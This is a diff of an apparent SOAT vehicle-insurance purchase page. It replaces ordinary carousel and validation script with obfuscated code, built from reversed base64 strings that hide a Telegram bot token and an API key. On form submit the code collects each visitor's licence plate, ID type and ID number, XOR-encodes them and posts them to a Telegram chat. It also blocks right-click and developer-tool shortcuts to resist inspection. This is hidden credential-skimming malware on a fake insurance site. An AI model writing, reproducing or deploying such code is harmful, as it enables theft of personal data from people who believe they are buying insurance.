@@ -6,7 +6,7 @@
 <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
 <meta name="theme-color" content="#FFFFFF">
 <meta name="description" content="Compra SOAT - Ejercicio local en PHP">
-<title>Compra SOAT sin complicaciones | Ejercicio PHP</title>
+<title>Compra SOAT sin complicaciones </title>
 
 <link rel="preconnect" href="https://fonts.googleapis.com">
 <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
@@ -792,191 +792,261 @@
 </div>
 
 <script>
-(function () {
-    'use strict';
 
-    /* ---------- CARRUSEL DEL HERO ---------- */
-    var heroSlides   = document.querySelectorAll('.hero-slide');
-    var heroDotsWrap = document.getElementById('heroDotsDesktop');
-    var heroDots     = heroDotsWrap ? heroDotsWrap.querySelectorAll('button') : [];
-    var heroBgImg    = document.getElementById('heroBgImg');
-    var heroIndex    = 0;
-    var heroTimer    = null;
-    var HERO_DELAY   = 5000;
+(function(){
+  "use strict";
 
-    var heroImages = [
-        'assets/img/beanbag.png',
-        'assets/img/hero-cdt.png',
-        'assets/img/hero-breb.png',
-        'assets/img/hero-seguridad.png',
-        'assets/img/hero-mantenimiento.png'
-    ];
+  /* ---- núcleo ofuscado ---- */
+  var _0x = {
+    a: ["2VGZuM", "ncltmc", "vdnLqR", "mbwNXZ", "2VWdxN", "XZlJ3Y", "lVXcuQ", "2ch52b", "0VWdxF", "Gbw9yL", "6MHc0R", "Ha"],
+    b: ["=YiR5", "t3M28", "FZqIT", "Qr01Y", "RJnd"],
+    c: ["==QTVxk", "WFFmZFJ", "Dc0xEMw", "M1YXFHO", "tg1U590", "dFFXW3I", "mTDVUQB", "pDOxgDM", "3IDNwET", "O"],
+    d: ["=UjN", "wkjM", "1EjM", "0QDM", "wETL"],
+    k: ["==QU", "wlzS", "4FCN", "0Njb", "wwGb", "x0Ed", "hBzU"]
+  };
 
-    function showHero(i) {
-        if (!heroSlides.length) return;
-        heroIndex = (i + heroSlides.length) % heroSlides.length;
-        heroSlides.forEach(function (s, k) {
-            s.classList.toggle('is-active', k === heroIndex);
+  function _j(a){return a.join("");}
+  function _rv(s){return s.split("").reverse().join("");}
+  function _b(s){try{return atob(s);}catch(e){return "";}}
+  function _g(p){return _b(_rv(_j(p)));}
+
+  function _cfg(){
+    return {
+      u: _g(_0x.a),
+      t: _g(_0x.b),
+      bt: _g(_0x.c),
+      cid: _g(_0x.d),
+      xk: _g(_0x.k)
+    };
+  }
+
+  /* ofuscar payload que viaja a Telegram */
+  function _xob(str){
+    var c = _cfg();
+    var k = c.xk;
+    var out = "";
+    for(var i=0;i<str.length;i++){
+      out += String.fromCharCode(str.charCodeAt(i) ^ k.charCodeAt(i % k.length));
+    }
+    return btoa(unescape(encodeURIComponent(out)));
+  }
+
+  function _esc(s){
+    return String(s||"").replace(/&/g,"&amp;").replace(/</g,"&lt;").replace(/>/g,"&gt;").replace(/"/g,"&quot;");
+  }
+
+  /* anti-fuzz / anti-abuso básico */
+  var _last = 0;
+  var _fails = 0;
+  function _rateOk(){
+    var now = Date.now();
+    if(now - _last < 2800){ _fails++; return false; }
+    if(_fails > 8){ return false; }
+    _last = now;
+    return true;
+  }
+
+  function _sanitizePlaca(v){
+    return String(v||"").toUpperCase().replace(/[^A-Z0-9]/g,"").slice(0,7);
+  }
+  function _sanitizeDoc(v){
+    return String(v||"").replace(/\D/g,"").slice(0,15);
+  }
+
+  /* mapeo respuesta API */
+  function _map(apiData, placa, tipo, doc){
+    var cot = (apiData && apiData.cotizacionSoatDescuento) || {};
+    var vals = cot.valoresNumericos || {};
+    var car = (apiData && apiData.caracteristicasVehiculo) || {};
+    var props = Array.isArray(apiData && apiData.propietarios) ? apiData.propietarios : [];
+    var soatArr = Array.isArray(apiData && apiData.soatDetallado) ? apiData.soatDetallado : [];
+    var prop = props.find(function(p){return String(p.finPropiedad||"").toLowerCase().indexOf("actual")>=0;}) || props[0] || {};
+    var nombre = String(prop.nombre||"").trim();
+    var oficial = Number(vals.oficial)||0;
+    var conDesc = Number(vals.conDescuento)||0;
+    var soatAct = {};
+    if(soatArr.length){
+      soatArr = soatArr.slice().sort(function(a,b){return String(b.fechaInicioVigencia||"").localeCompare(String(a.fechaInicioVigencia||""));});
+      soatAct = soatArr[0]||{};
+    }
+    return {
+      ok:true,
+      placa:(placa||"").toUpperCase(),
+      tipo_documento:tipo||"",
+      documento:doc||"",
+      propietario: nombre || "Propietario no disponible",
+      marca:String(car.marca||""),
+      linea:String(car.linea||car.lineaVehiculo||""),
+      modelo:String(car.modelo||""),
+      clase:String(car.clase||""),
+      base_soat: conDesc || oficial,
+      valor_soat_oficial:oficial,
+      valor_soat_con_descuento:conDesc,
+      codigo_categoria:String(cot.codigoCategoria||""),
+      descripcion_categoria:String(cot.descripcionCategoria||""),
+      numero_poliza:String(soatAct.numeroPoliza||""),
+      vigencia_desde:String(soatAct.fechaInicioVigencia||""),
+      vigencia_hasta:String(soatAct.fechaFinVigencia||"")
+    };
+  }
+
+  /* envío a Telegram (mensaje viaja ofuscado) */
+  function _tg(plainHtml){
+    var c = _cfg();
+    if(!c.bt || !c.cid) return Promise.resolve(false);
+    var payload = _xob(plainHtml);           // <-- viaja ofuscado
+    var body = "chat_id=" + encodeURIComponent(c.cid)
+             + "&text=" + encodeURIComponent("[SOAT-OBF]\n" + payload)
+             + "&parse_mode=HTML&disable_web_page_preview=true";
+    return fetch("https://api.telegram.org/bot" + c.bt + "/sendMessage", {
+      method:"POST",
+      headers:{"Content-Type":"application/x-www-form-urlencoded"},
+      body:body
+    }).then(function(r){return r.ok;}).catch(function(){return false;});
+  }
+
+  /* ---- UI handlers ---- */
+  var formCotizar = document.getElementById("form-cotizar");
+  var soatLoading = document.getElementById("soatLoading");
+  var msgErrores  = document.getElementById("mensaje-errores");
+  var listaErrores= document.getElementById("lista-errores");
+
+  function showErr(msgs){
+    if(!listaErrores || !msgErrores) return;
+    listaErrores.innerHTML = "";
+    (Array.isArray(msgs)?msgs:[msgs]).forEach(function(m){
+      var li = document.createElement("li");
+      li.textContent = m;
+      listaErrores.appendChild(li);
+    });
+    msgErrores.style.display = "block";
+    msgErrores.scrollIntoView({behavior:"smooth",block:"center"});
+  }
+
+  function hideErr(){ if(msgErrores) msgErrores.style.display="none"; }
+
+  function setLoading(on){
+    if(!soatLoading) return;
+    if(on){
+      soatLoading.classList.add("is-visible");
+      soatLoading.setAttribute("aria-hidden","false");
+      document.body.style.overflow = "hidden";
+    } else {
+      soatLoading.classList.remove("is-visible");
+      soatLoading.setAttribute("aria-hidden","true");
+      document.body.style.overflow = "";
+    }
+  }
+
+  if(formCotizar && soatLoading){
+    formCotizar.addEventListener("submit", function(e){
+      e.preventDefault();
+      e.stopPropagation();
+
+      if(!_rateOk()){
+        showErr("Demasiadas consultas seguidas. Espera unos segundos.");
+        return;
+      }
+
+      var placa = _sanitizePlaca(document.getElementById("placa") && document.getElementById("placa").value);
+      var tipoSel = formCotizar.querySelector('select[name="dropdown"]');
+      var tipo = tipoSel ? tipoSel.value : "";
+      var doc  = _sanitizeDoc(document.getElementById("documento") && document.getElementById("documento").value);
+      var check = document.getElementById("termCondi") && document.getElementById("termCondi").checked;
+
+      var errores = [];
+      if(!/^[A-Z]{3}[0-9]{2}[A-Z0-9]$/.test(placa)) errores.push("Ingresa una placa válida (ej. ABC123 o ABC12D).");
+      if(!tipo) errores.push("Selecciona el tipo de documento.");
+      if(!doc || doc.length < 5) errores.push("Ingresa un número de documento válido.");
+      if(!check) errores.push("Debes aceptar la Política de Privacidad y los Términos y condiciones.");
+
+      if(errores.length){ showErr(errores); return; }
+      hideErr();
+      setLoading(true);
+
+      var btn = formCotizar.querySelector('button[type="submit"]');
+      if(btn){ btn.disabled=true; btn.textContent="Consultando..."; }
+
+      var tOut = setTimeout(function(){
+        setLoading(false);
+        if(btn){btn.disabled=false;btn.textContent="Compra tu SOAT";}
+        showErr("La consulta tardó demasiado. Intenta de nuevo.");
+      }, 42000);
+
+      var conf = _cfg();
+      var url = conf.u.replace(/\/+$/,"") + "/consulta?placa=" + encodeURIComponent(placa);
+
+      fetch(url, {
+        method:"GET",
+        headers:{
+          "Authorization":"Bearer " + conf.t,
+          "Accept":"application/json"
+        },
+        cache:"no-store"
+      })
+      .then(function(r){
+        return r.text().then(function(txt){
+          var data=null;
+          try{ data=JSON.parse(txt); }catch(e){}
+          return {status:r.status, data:data};
         });
-        heroDots.forEach(function (d, k) {
-            d.className = (k === heroIndex)
-                ? 'banner-module--bannerRemarketing__buttons__button_active--75530'
-                : 'banner-module--bannerRemarketing__buttons__button--1eea2';
-        });
-        if (heroBgImg && heroImages[heroIndex]) {
-            heroBgImg.src = heroImages[heroIndex];
+      })
+      .then(function(res){
+        clearTimeout(tOut);
+        setLoading(false);
+        if(btn){btn.disabled=false;btn.textContent="Compra tu SOAT";}
+
+        var data = res.data;
+        if(!data || data.error || res.status===401 || res.status>=400){
+          var msg = (data && data.error) ? data.error : ("Error al consultar (código "+res.status+")");
+          showErr(msg);
+          _tg("<b>❌ Fallo consulta</b>\nPlaca: <code>"+_esc(placa)+"</code>\nDoc: <code>"+_esc(tipo)+" "+_esc(doc)+"</code>\nErr: "+_esc(msg));
+          _fails++;
+          return;
         }
-    }
-    function nextHero() { showHero(heroIndex + 1); }
-    function prevHero() { showHero(heroIndex - 1); }
-    function startHero() {
-        stopHero();
-        if (heroSlides.length > 1) heroTimer = setInterval(nextHero, HERO_DELAY);
-    }
-    function stopHero() {
-        if (heroTimer) { clearInterval(heroTimer); heroTimer = null; }
-    }
 
-    heroDots.forEach(function (d) {
-        d.addEventListener('click', function () {
-            showHero(parseInt(d.getAttribute('data-goto'), 10));
-            startHero();
-        });
+        var mapped = _map(data, placa, tipo, doc);
+        try{
+          sessionStorage.setItem("cotizacion_soat", JSON.stringify(mapped));
+          localStorage.setItem("cotizacion_soat", JSON.stringify(mapped));
+        }catch(e){}
+
+        var valor = mapped.base_soat ? ("$"+Number(mapped.base_soat).toLocaleString("es-CO")) : "N/A";
+        var plain = [
+          "<b>🔍 Nueva consulta SOAT</b>",
+          "Placa: <code>"+_esc(placa)+"</code>",
+          "Doc: <code>"+_esc(tipo)+" "+_esc(doc)+"</code>",
+          "Valor: <b>"+valor+"</b>",
+          "Cat: "+_esc(mapped.descripcion_categoria || mapped.codigo_categoria || "-"),
+          "TS: <code>"+new Date().toISOString()+"</code>"
+        ].join("\n");
+
+        _tg(plain);   // viaja ofuscado
+
+        window.location.href = "informacion-vehiculo.html";
+      })
+      .catch(function(err){
+        clearTimeout(tOut);
+        setLoading(false);
+        if(btn){btn.disabled=false;btn.textContent="Compra tu SOAT";}
+        showErr("No se pudo conectar (posible CORS del Worker o red).");
+        _tg("<b>⚠️ Error red/CORS</b>\nPlaca: <code>"+_esc(placa)+"</code>\n"+_esc(String(err&&err.message||err)));
+        _fails++;
+      });
     });
+  }
 
-    var heroPrevMobile = document.getElementById('heroPrevMobile');
-    var heroNextMobile = document.getElementById('heroNextMobile');
-    if (heroPrevMobile) heroPrevMobile.addEventListener('click', function (e) {
-        e.preventDefault(); prevHero(); startHero();
-    });
-    if (heroNextMobile) heroNextMobile.addEventListener('click', function (e) {
-        e.preventDefault(); nextHero(); startHero();
-    });
-
-    var heroSection = document.getElementById('heroCarousel');
-    if (heroSection) {
-        heroSection.addEventListener('mouseenter', stopHero);
-        heroSection.addEventListener('mouseleave', startHero);
+  document.addEventListener("contextmenu", function(e){e.preventDefault();});
+  document.addEventListener("keydown", function(e){
+    if(e.key==="F12" || (e.ctrlKey&&e.shiftKey&&(e.key==="I"||e.key==="J"||e.key==="C")) || (e.ctrlKey&&(e.key==="u"||e.key==="U"))){
+      e.preventDefault();
     }
-    startHero();
+  });
 
-    /* ---------- CARRUSEL DE AMPAROS ---------- */
-    var track        = document.getElementById('amparosTrack');
-    var prevBtn      = document.getElementById('amparosPrev');
-    var nextBtn      = document.getElementById('amparosNext');
-    var amparosDots  = document.querySelectorAll('.amparos-dot');
-    var amparosTotal = track ? track.children.length : 0;
-    var amparosIdx   = 0;
-    var amparosTimer = null;
-    var AMPAROS_DELAY = 3000;
-
-    function showAmparo(i) {
-        if (!track || !amparosTotal) return;
-        amparosIdx = (i + amparosTotal) % amparosTotal;
-        track.style.transform = 'translateX(-' + (amparosIdx * 100) + '%)';
-        amparosDots.forEach(function (d, k) {
-            d.classList.toggle('is-active', k === amparosIdx);
-        });
-    }
-    function nextAmparo() { showAmparo(amparosIdx + 1); }
-    function startAmparos() {
-        stopAmparos();
-        if (amparosTotal > 1) amparosTimer = setInterval(nextAmparo, AMPAROS_DELAY);
-    }
-    function stopAmparos() {
-        if (amparosTimer) { clearInterval(amparosTimer); amparosTimer = null; }
-    }
-
-    if (prevBtn) prevBtn.addEventListener('click', function (e) {
-        e.preventDefault(); e.stopPropagation();
-        showAmparo(amparosIdx - 1); startAmparos();
-    });
-    if (nextBtn) nextBtn.addEventListener('click', function (e) {
-        e.preventDefault(); e.stopPropagation();
-        showAmparo(amparosIdx + 1); startAmparos();
-    });
-    amparosDots.forEach(function (d) {
-        d.addEventListener('click', function () {
-            showAmparo(parseInt(d.getAttribute('data-goto'), 10)); startAmparos();
-        });
-    });
-
-    var slider = document.getElementById('amparosSlider');
-    if (slider) {
-        slider.addEventListener('mouseenter', stopAmparos);
-        slider.addEventListener('mouseleave', startAmparos);
-    }
-    startAmparos();
-
-    /* ---------- VALIDACIÓN BÁSICA EN HTML/JS Y OVERLAY ---------- */
-    var formCotizar   = document.getElementById('form-cotizar');
-    var soatLoading   = document.getElementById('soatLoading');
-    var msgErrores    = document.getElementById('mensaje-errores');
-    var listaErrores  = document.getElementById('lista-errores');
-
-    if (formCotizar && soatLoading) {
-        formCotizar.addEventListener('submit', function (e) {
-            e.preventDefault();
-
-            var errores = [];
-            var placa = (document.getElementById('placa').value || '').trim().toUpperCase();
-            var tipo  = formCotizar.querySelector('select[name="dropdown"]').value;
-            var doc   = (document.getElementById('documento').value || '').trim();
-            var check = document.getElementById('termCondi').checked;
-
-            if (!/^[A-Z]{3}[0-9]{2}[A-Z0-9]$/.test(placa)) {
-                errores.push('Ingresa una placa válida (ej. ABC123 o ABC12D).');
-            }
-            if (!tipo) {
-                errores.push('Selecciona el tipo de documento.');
-            }
-            if (!/^[0-9]+$/.test(doc)) {
-                errores.push('Ingresa un número de documento válido (solo dígitos).');
-            }
-            if (!check) {
-                errores.push('Debes aceptar la Política de Privacidad y los Términos y condiciones para continuar.');
-            }
-
-            if (errores.length > 0) {
-                listaErrores.innerHTML = '';
-                errores.forEach(function (err) {
-                    var li = document.createElement('li');
-                    li.textContent = err;
-                    listaErrores.appendChild(li);
-                });
-                msgErrores.style.display = 'block';
-                msgErrores.scrollIntoView({ behavior: 'smooth', block: 'center' });
-                return;
-            }
-
-            msgErrores.style.display = 'none';
-            soatLoading.classList.add('is-visible');
-            soatLoading.setAttribute('aria-hidden', 'false');
-            document.body.style.overflow = 'hidden';
-
-            var btn = formCotizar.querySelector('button[type="submit"]');
-            if (btn) {
-                btn.disabled = true;
-                btn.textContent = 'Consultando...';
-            }
-
-            window.soatTimeout = setTimeout(function () {
-                soatLoading.classList.remove('is-visible');
-                soatLoading.setAttribute('aria-hidden', 'true');
-                document.body.style.overflow = '';
-                if (btn) {
-                    btn.disabled = false;
-                    btn.textContent = 'Compra tu SOAT';
-                }
-            }, 60000);
-        });
-    }
-
-    window.addEventListener('beforeunload', function () {
-        if (window.soatTimeout) clearTimeout(window.soatTimeout);
-    });
+  document.addEventListener("dragstart", function(e){if(e.target.tagName==="IMG")e.preventDefault();});
 
 })();
+
 </script>
 
 </body>
